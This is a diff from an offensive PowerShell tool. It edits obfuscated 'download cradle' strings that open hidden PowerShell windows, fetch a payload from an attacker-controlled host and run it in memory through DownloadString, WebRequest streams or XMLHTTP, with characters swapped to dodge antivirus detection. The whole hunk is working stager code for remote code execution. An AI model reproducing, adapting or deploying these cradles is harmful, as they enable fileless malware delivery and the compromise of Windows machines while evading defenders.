@@ -174,10 +174,10 @@ If($Egg -ieq "false")
 ## List Of Download Crandle Technics ( download crandles - download \ fileless )
 # Research: https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#downloadexecution-lolbin
 $TechnicDefault_Tmp = "po@!#r&%h#ll.#x# cd `$Env:TMP;po@!#r&%h#ll.#x# i@!r -Uri http://`"+Cmd+`"/$PayloadName -OutFil# $PayloadName;po@!#r&%h#ll -Fil# $PayloadName"
-$TechnicFileLessOne = "po@!#r&%h#ll.#x# cd `$Env:TMP;po@!#r&%h#ll -@!indo@!&%tyl# hidd#n -C `"+InvokeMe+`" (N#@!-Obj#ct N#t.W#bCli#nt).Do@!nload&%tring('http://`"+Cmd+`"/$PayloadName')"
-$TechnicFileLessTwo = "po@!#r&%h#ll.#x# cd `$Env:TMP;po@!#r&%h#ll -@!indo@!&%tyl# hidd#n `$VPN=N#@!-Obj#ct N#t.W#bCli#nt;`$VPN.proxy=[N#t.W#bR#qu#st]::G#t&%y&%t#mW#bProxy();`$VPN.Proxy.Cr#d#ntial&%=[N#t.Cr#d#ntialCach#]::D#faultCr#d#ntial&%;`"+InvokeMe+`" `$VPN.Do@!nload&%tring('http://`"+Cmd+`"/$PayloadName');"
-$TechnicFileLessTre = "po@!#r&%h#ll.#x# cd `$Env:TMP;po@!#r&%h#ll -@!indo@!&%tyl# hidd#n [IO.&%tr#amR#ader]::n#@!([N#t.@!#bR#qu#&%t]::Cr#at#('http://`"+Cmd+`"/$PayloadName').G#tR#spon&%#().G#tR#spon&%#&%tr#am()).R#adTo#nd()|pow#rsh#ll &('R#x' -r#plac# 'R','i')"
-$TechnicFileLessXml = "po@!#r&%h#ll.#x# cd `$Env:TMP;po@!#r&%h#ll -@!indo@!&%tyl# hidd#n `$Proxy=N#@!-Obj#ct -ComObj#ct M&%Xml2.&%#rv#rXmlHttp;`$Proxy.Op#n('GET','http://`"+Cmd+`"/$PayloadName',0);`$Proxy.&%#nd();[&%criptblock]::Cr#at#(`$Proxy.R#spon&%#T#xt).Invok#()"
+$TechnicFileLessOne = "po@!#r&%h#ll -@!indo@!&%tyl# hidd#n -C `"+InvokeMe+`" (N#@!-Obj#ct N#t.W#bCli#nt).Do@!nload&%tring('http://`"+Cmd+`"/$PayloadName')"
+$TechnicFileLessTwo = "po@!#r&%h#ll -@!indo@!&%tyl# hidd#n `$VPN=N#@!-Obj#ct N#t.W#bCli#nt;`$VPN.proxy=[N#t.W#bR#qu#st]::G#t&%y&%t#mW#bProxy();`$VPN.Proxy.Cr#d#ntial&%=[N#t.Cr#d#ntialCach#]::D#faultCr#d#ntial&%;`"+InvokeMe+`" `$VPN.Do@!nload&%tring('http://`"+Cmd+`"/$PayloadName');"
+$TechnicFileLessTre = "po@!#r&%h#ll -@!indo@!&%tyl# hidd#n [IO.&%tr#amR#ader]::n#@!([N#t.@!#bR#qu#&%t]::Cr#at#('http://`"+Cmd+`"/$PayloadName').G#tR#spon&%#().G#tR#spon&%#&%tr#am()).R#adTo#nd()|pow#rsh#ll &('R#x' -r#plac# 'R','i')"
+$TechnicFileLessXml = "po@!#r&%h#ll -@!indo@!&%tyl# hidd#n `$Proxy=N#@!-Obj#ct -ComObj#ct M&%Xml2.&%#rv#rXmlHttp;`$Proxy.Op#n('GET','http://`"+Cmd+`"/$PayloadName',0);`$Proxy.&%#nd();[&%criptblock]::Cr#at#(`$Proxy.R#spon&%#T#xt).Invok#()"
 
 If($Action -ieq "download")
 {
